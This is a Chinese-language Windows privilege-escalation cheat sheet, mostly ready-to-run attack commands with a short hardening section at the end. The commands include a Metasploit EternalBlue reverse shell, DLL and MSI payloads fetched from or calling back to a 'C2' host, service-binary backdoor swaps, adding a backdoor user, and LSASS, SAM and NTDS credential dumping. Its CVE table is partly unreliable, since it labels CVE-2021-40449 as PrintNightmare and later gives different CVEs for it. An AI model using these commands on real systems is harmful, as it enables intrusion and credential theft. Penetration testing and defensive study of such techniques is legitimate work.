# Windows 提权手法速查手册

> Windows 提权的核心思路与 Linux 类似，但路径和工具生态差异巨大。本手册总结常见提权路径与实战手法。

## 1. 提权前的信息收集

拿到 Windows Shell 后，先确认"我在哪、有什么权限、有什么服务"：

| 命令 | 作用 |
|------|------|
| `whoami /priv` | 查看当前 Token 特权（如 `SeImpersonatePrivilege` 基本等于提权） |
| `whoami /all` | 当前用户 SID、组、特权 |
| `systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"` | 系统版本、补丁 |
| `wmic qfe get Caption,Description,HotFixID,InstalledOn` | 已安装补丁（用于推断缺失的 CVE） |
| `net user`、`net localgroup administrators` | 本地账户 / 管理员组成员 |
| `netstat -ano` | 监听端口与连接 |
| `tasklist /v`、`wmic process list brief` | 运行中的进程 |
| `wmic service get name,displayname,pathname,startmode` | 服务列表及可执行路径 |
| `wmic product get name,version` | 已安装软件 |
| `wmic share get name,path,status` | 共享目录 |
| `net view /domain`、`net view` | 域 / 网络邻居 |
| `reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost" /s` | SVCHOST 信息 |
| `schtasks /query /fo LIST /v` | 计划任务 |
| `dir /s /b "C:\Program Files\*.exe" 2>nul | more` | 枚举安装的程序 |
| `accesschk64.exe -wuvc daclsvc "Authenticated Users"` | 权限检查（Sysinternals） |

常用自动化工具：`winPEAS.bat / winPEAS.exe`、`PowerUp.ps1`（PowerShell 版）、`Sherlock.ps1`（枚举缺失补丁）、`Watson` (.NET)、`BeRoot`、`PowerView.ps1`

```powershell
# 上传 winPEAS 并执行
.\winPEASany.exe servicesinfo applicationsinfo processinfo quiet
```

## 2. 系统漏洞 / 缺失补丁提权

经典 Windows Kernel Exploit 速查表（按影响范围排序）：

| CVE | 影响系统 | 说明 |
|-----|---------|------|
| **CVE-2021-40449** (PrintNightmare) | 多版本 Windows, Windows Server | Spooler 服务 RCE + 提权 |
| **CVE-2023-36802** | Windows 多个版本 | MSHTML / CTF 框架提权 |
| **CVE-2021-36934** (SeriousSAM) | Win10/11/Server | Hive 权限配置错误，可读 SAM |
| **CVE-2020-1472** (ZeroLogon) | 域控 | NetLogon 协议漏洞置空机器账户密码 |
| **CVE-2020-0787** / **CVE-2020-0796** (SMBGhost) | Win10/Server 1903+ | SMB 协议远程代码执行 |
| **CVE-2019-1458** | Win10/Server 2012 R2 | Win32k 提权 |
| **CVE-2019-0803** | Win10 1809 | Win32k 提权 |
| **CVE-2018-8120** | Win7/2008 | Win32k 提权 |
| **CVE-2017-0144** (EternalBlue / MS17-010) | Win7/2008/Win10 RTM | SMB v1 RCE，影响极大 |
| **MS16-032** | 多系统 | Secondary Logon 服务提权 |
| **MS15-051** | Win7/2008/2012 | 内核提权 |
| **MS14-058** | 多系统 | Win32k 提权 |
| **MS10-092** | Win7/2008 R2 | 计划任务服务提权 |

```powershell
# 示例：MS17-010 / EternalBlue 使用 Metasploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS target
set PAYLOAD windows/meterpreter/reverse_tcp
set LHOST attacker
run

# 示例：PrintNightmare (CVE-2021-1675 / CVE-2021-34527)
# 远程加载 DLL：
rundll32 \\C2\share\evil.dll,DllMain
# 或使用 PowerShell 版本
```

### 2.1 Sherlock / Watson（自动识别缺失补丁）

```powershell
# Sherlock.ps1 - 旧版 PowerShell 2.0 兼容
Import-Module .\Sherlock.ps1
Find-AllVulns

# Watson - 更高版本 .NET 工具
.\Watson.exe
```

## 3. 服务配置错误提权

Windows 服务中存在几类典型的权限配置错误：

### 3.1 可写服务路径 / 可写服务二进制

服务以 SYSTEM 运行，但其可执行文件路径可被普通用户写：

```cmd
# 枚举所有服务
wmic service get name,displayname,pathname,startmode
sc qc <servicename>

# 利用 PowerUp.ps1 快速发现漏洞服务
Import-Module .\PowerUp.ps1
Get-ServiceFilePermission
Get-ServicePermission
Get-ModifiableService
Get-ModifiableServiceFile

# 假设已发现 "VulnSvc" 的 BINARY_PATH_NAME 指向 C:\Program Files\Vuln\v.exe 且可写
# 则将恶意 exe 替换为我们的后门
copy /y C:\Users\Public\evil.exe "C:\Program Files\Vuln\v.exe"
sc stop VulnSvc
sc start VulnSvc
```

### 3.2 服务路径未加引号（Path Unquoted）

当服务配置类似 `C:\Program Files\Vuln Service\svc.exe`（未用引号）时，Windows 会尝试以下顺序：

```
C:\Program.exe
C:\Program Files\Vuln.exe
C:\Program Files\Vuln Service\svc.exe
```

若攻击者可在任一中间目录写入 `Program.exe` 等，则可以 SYSTEM 身份执行：

```cmd
# 查找路径未加引号的服务
wmic service get name,pathname,startmode | findstr /i /v """C:\Windows\\""" | findstr /i /v """

# 或者使用 PowerUp
Get-UnquotedService

# 利用
copy /y C:\Users\Public\evil.exe "C:\Program.exe"
# 重启对应服务或等待系统重启
sc stop <service> && sc start <service>
```

### 3.3 弱权限服务（可被普通用户修改配置）

当普通用户对某个服务有 `SERVICE_CHANGE_CONFIG` 权限时：

```cmd
sc qc <ServiceName>
# 修改 binPath 为恶意可执行
sc config <ServiceName> binPath= "C:\Users\Public\evil.exe"
sc config <ServiceName> obj= ".\LocalSystem" password= ""
sc stop <ServiceName>
sc start <ServiceName>
```

PowerUp 的 `Get-ServiceAbuse` / `Install-ServiceBinary` 可一站式完成。

### 3.4 AlwaysInstallElevated（MSI 以 SYSTEM 安装）

若以下两个注册表键值均为 1，则任意 MSI 文件都将以 SYSTEM 身份被安装：

```
HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated
```

```powershell
# 检查
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

# 利用：生成 MSI 安装包（可用 wix、msfvenom、或 SharpStuff）
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=C2 LPORT=443 -f msi > evil.msi
msiexec /quiet /qn /i C:\Users\Public\evil.msi

# PowerUp 快捷命令
Install-ServiceBinary -Name 'VulnSvc' -Path 'net user backdoor Password1! /add'
```

## 4. 计划任务 / 启动项提权

若高权限（SYSTEM）的计划任务执行的脚本或二进制可被普通用户写入：

```cmd
schtasks /query /fo LIST /v
# 或 PowerView
Get-ScheduledTask
```

启动项路径检查：

```
C:\Users\All Users\Microsoft\Windows\Start Menu\Programs\Startup
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup
```

## 5. 计划任务 / 启动项 / 服务 DLL 劫持

### 5.1 DLL Hijack

当应用以 SYSTEM 身份运行并使用相对路径加载 DLL 时，攻击者可将同名恶意 DLL 放到 PATH 搜索靠前的位置：

```
# 示例：VulnApp.exe 加载 missing.dll（缺失或路径未固定）
# 可使用 tools: Process Monitor (procmon) 过滤 PATH NOT FOUND 观察缺失 DLL
# 替换后重启应用即可执行恶意 DLL
```

### 5.2 Phantom DLL Hijacking / Proxy DLL

重写某关键系统 DLL 并转发原 API 调用，在 `DllMain` 中执行后门逻辑。工具：`Roguespotter`、`sRDI` 等。

## 6. 凭据 / 令牌相关提权

### 6.1 模拟 / 令牌窃取

若当前 Token 包含 `SeImpersonatePrivilege` / `SeAssignPrimaryTokenPrivilege`，可使用 **Juicy Potato** / **RoguePotato** / **SweetPotato** / **PrintSpoofer** 以 SYSTEM 身份执行命令：

```cmd
# PrintSpoofer（较新，兼容 Windows 10/Server 2019+）
PrintSpoofer64.exe -i -c "cmd.exe"

# Juicy Potato（旧版 Windows）
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -t * -c {CLSID}

# RoguePotato
RoguePotato.exe -r C2 -l 9999 -e "cmd.exe"
```

### 6.2 从 LSASS 导出凭据

```powershell
# 转储 LSASS 进程
.\procdump64.exe -accepteula -ma lsass.exe lsass.dmp
# 离线使用 mimikatz
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords

# 直接使用 mimikatz
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

### 6.3 SAM / SYSTEM / NTDS.dit

```powershell
# 备份注册表 hive
reg save HKLM\SYSTEM C:\Users\Public\system
reg save HKLM\SAM C:\Users\Public\sam
reg save HKLM\SECURITY C:\Users\Public\security

# 在线解密（impacket secretsdump）
python3 secretsdump.py -sam sam -system system LOCAL

# 在域控上导出 NTDS
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
# 得到 Active Directory/ntds.dit + registry/SYSTEM + registry/SECURITY
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

## 7. 可写注册表项 / 服务注册表配置错误

某些服务在启动时读 `HKLM\SYSTEM\CurrentControlSet\Services\<Service>\ImagePath`。若普通用户可写该键：

```cmd
reg add "HKLM\SYSTEM\CurrentControlSet\Services\VulnSvc" /v ImagePath /t REG_SZ /d "C:\Users\Public\evil.exe" /f
sc stop VulnSvc
sc start VulnSvc
```

## 8. 修复建议（蓝队视角）

1. **及时打补丁**：关注 `MSRC` 高危通告，优先修补 Kernel / Spooler / SMB / RDP 等组件
2. **服务安全配置**：
   - 所有服务 `binPath` 用双引号包裹
   - 服务目录对普通用户不可写
   - 服务账号最小权限原则，避免以 SYSTEM 运行不必要的服务
3. **禁用 AlwaysInstallElevated**
4. **注册表 ACL 加固**：关键注册表路径（如 HKLM\SYSTEM\CurrentControlSet\Services）普通用户不可写
5. **LAPS 管理本地管理员密码**：避免统一本地账户密码，防止横向扩散
6. **LSA 保护 + Credential Guard**：启用 `RunAsPPL`、`HVCI` 等保护机制
7. **监控敏感行为**：`SeDebugPrivilege` 的使用、procdump 等工具执行、可疑服务创建

---

> Windows 提权是信息收集 → 漏洞匹配 → 执行的循环。提权前务必确认目标环境与所用工具的兼容性，避免误触发系统崩溃。本指南仅用于合法授权的渗透测试与企业安全审计。
